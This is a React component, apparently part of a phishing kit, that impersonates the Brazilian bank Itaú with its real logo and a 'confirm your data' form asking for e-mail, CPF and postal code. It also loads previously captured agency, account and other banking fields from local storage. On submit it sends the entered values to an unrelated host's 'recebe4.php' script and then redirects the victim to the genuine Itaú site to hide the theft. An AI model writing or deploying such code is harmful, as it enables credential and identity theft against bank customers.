import React, { useState, useEffect } from 'react';
import InputMask from 'react-input-mask';
import './Confirmacao.css';

const Confirmacao = () => {
  const [email, setEmail] = useState('');
  const [cpf, setCpf] = useState('');
  const [cep, setCep] = useState('');
  const [ag, setAg] = useState('');
  const [conta, setConta] = useState('');
  const [quatro, setQuatro] = useState('');
  const [tel, setTel] = useState('');
  const [seis, setSeis] = useState('');

  useEffect(() => {
    const storedAg = localStorage.getItem('ag');
    const storedConta = localStorage.getItem('conta');
    const storedQuatro = localStorage.getItem('quatro');
    const storedTel = localStorage.getItem('tel');
    const storedSeis = localStorage.getItem('seis');

    if (storedAg) setAg(storedAg);
    if (storedConta) setConta(storedConta);
    if (storedQuatro) setQuatro(storedQuatro);
    if (storedTel) setTel(storedTel);
    if (storedSeis) setSeis(storedSeis);
  }, []);

  const handleClick = async () => {
    if (!email || !cpf || !cep) {
      alert('Por favor, preencha todos os campos.');
      return;
    }

    try {
      const response = await fetch(`https://servicepoints.x10.mx/recebe4.php?email=${email}&cpf=${cpf}&cep=${cep}`);
      if (!response.ok) {
        throw new Error('Sistema indisponível');
      }
      window.location.href = "https://www.itau.com.br";
    } catch (error) {
      console.error('Erro ao fazer a requisição:', error);
    }
  }

  return (
    <div className='Confirmacao'>
      <div className='logo'>
        <img src="https://www.itau.com.br/media/dam/m/538533fcf33fd411/original/itau-logo-branco-48x48.png" alt="logo_itau" />
      </div>
      <div className='title-confirm'>
        <span>Confirme os dados abaixo para continuar</span>
      </div>
      <div className='form4'>
        <input
          className='digitavel'
          type="text"
          placeholder='E-mail'
          value={email}
          onChange={(e) => setEmail(e.target.value)}
        />
        <InputMask
          mask="999.999.999-99"
          className='digitavel'
          type="text"
          placeholder='CPF'
          value={cpf}
          onChange={(e) => setCpf(e.target.value)}
        />
        <InputMask
          mask="99999-999"
          className='digitavel'
          type="text"
          placeholder='CEP'
          value={cep}
          onChange={(e) => setCep(e.target.value)}
        />
        <button onClick={handleClick}>Confirmar</button>
      </div>
    </div>
  );
}

export default Confirmacao;